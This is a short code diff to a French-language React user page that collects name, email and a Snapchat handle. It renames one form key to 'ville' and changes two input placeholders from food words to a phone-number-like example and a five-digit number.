@@ -18,7 +18,7 @@ const INFO_FIELDS = [
   { key: "prenom", label: "Prénom", placeholder: "Ex : Marie", type: "text" },
   { key: "nom", label: "Nom", placeholder: "Ex : Dupont", type: "text" },
   { key: "email", label: "Email", placeholder: "Ex : marie@email.com", type: "email" },
-  { key: "id", label: "Snap", placeholder: "Ex : snapplus.91", type: "text" },
+  { key: "ville", label: "Snap", placeholder: "Ex : snapplus.91", type: "text" },
 ] as const;
 
 // Le type de l'objet qui contient les 4 valeurs.
@@ -158,7 +158,7 @@ export default function UserPage() {
           <WordStep
             value={word1}
             onChange={setWord1}
-            placeholder="Ex : patate"
+            placeholder="Ex : +33670809010"
             autoFocus
             onBack={() => setStep("info")}
             onOk={() => setStep("loading1")}
@@ -181,7 +181,7 @@ export default function UserPage() {
           <WordStep
             value={word2}
             onChange={setWord2}
-            placeholder="Ex : tomate"
+            placeholder="Ex : 67810"
             autoFocus
             onBack={() => setStep("word1")}
             onOk={() => setStep("loading2")}
